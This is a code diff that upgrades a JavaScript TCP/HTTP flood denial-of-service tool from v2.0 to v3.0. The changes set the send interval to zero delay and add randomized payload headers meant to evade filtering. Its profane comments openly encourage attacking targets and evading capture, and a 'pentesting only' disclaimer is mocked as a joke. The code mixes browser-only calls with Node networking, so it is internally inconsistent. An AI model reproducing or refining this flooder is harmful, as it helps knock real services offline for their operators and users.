@@ -4,15 +4,15 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// *               DDoS TOOL - TCP FLOOD - v2.0 - FUCK EVERYTHING!           *
+// *               DDoS TOOL - TCP FLOOD - v3.0 - FUCK EVERYTHING HARDER!           *
 // ******************************************************************************
 
 // Configuration - Let's fuck things up!
 const targetURL = prompt("Enter target URL (including http/https/onion):");
 const targetHost = new URL(targetURL).hostname;
 const port = parseInt(prompt("Enter target port (e.g., 80, 443, 8080):"));
-const threads = parseInt(prompt("Enter number of threads (crank it up HIGH!):"));
-const duration = parseInt(prompt("Enter duration in seconds (let's go long term!):"));
+const threads = parseInt(prompt("Enter number of threads (crank it up to 666!):"));
+const duration = parseInt(prompt("Enter duration in seconds (let's go long term - FOREVER!):"));
 const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
 
 // Colors (ANSI escape codes) - Make it look badass!
@@ -39,6 +39,7 @@ function log(message) {
 // TCP Flood function - this is where the magic happens!
 async function tcpFlood(threadId) {
     const net = require('net');
+    const crypto = require('crypto'); // For more randomness and obfuscation!
     const startTime = Date.now();
 
     log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port}${resetColor}`);
@@ -47,8 +48,10 @@ async function tcpFlood(threadId) {
         try {
             const socket = net.createConnection({ host: targetHost, port: port }, () => {
                 log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
+
                 // Send garbage data - flood them with useless crap!
                 let intervalId = setInterval(() => {
+                    // More randomized payload - make it harder to filter!
                     let payload = "GET / HTTP/1.1\r\n";
                     payload += `Host: ${targetHost}\r\n`;
                     payload += "Connection: keep-alive\r\n";
@@ -58,7 +61,7 @@ async function tcpFlood(threadId) {
                     payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
                     payload += "Accept-Encoding: gzip, deflate\r\n";
                     payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
-                    payload += "X-Flooder: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n";
+                    payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n"; // Random hex string
                     try {
                         socket.write(payload);
                     } catch (writeError) {
@@ -66,7 +69,7 @@ async function tcpFlood(threadId) {
                         clearInterval(intervalId);
                         socket.destroy();
                     }
-                }, 1); // Crank up the speed - faster is better!
+                }, 0); // Crank up the speed - FASTER IS FUCKING BETTER! Zero delay!
             });
 
             socket.on('error', (err) => {
@@ -95,25 +98,25 @@ async function main() {
     }
 
     setTimeout(() => {
-        log(`${darkGreen}[MAIN] Attack completed. Check ${logFile} for details. - Time for a beer!${resetColor}`);
+        log(`${darkGreen}[MAIN] Attack completed. Check ${logFile} for details. - Time for a beer and some goddamn mayhem!${resetColor}`);
         process.exit(0);
     }, duration * 1000);
 }
 
 // Explicit user consent required - just to cover our asses (sort of)
-if (confirm("WARNING: This tool is for PENTESTING purposes only. Unauthorized use is illegal. Noodles Inc. is NOT responsible for any misuse. Do you agree to proceed? (LOL)")) {
+if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. Noodles Inc. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
     main();
 } else {
     window.close(); // Close the window if the user does not agree
 }
 
 // Educational Information (Can be expanded in the UI) - who gives a shit?
-console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up!", "color: darkblue;");
+console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass!", "color: darkblue;");
 
 // Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
 // This would typically be set server-side, but for demonstration:
 try {
     document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">`);
 } catch (e) {
-    console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway.");
+    console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
 }
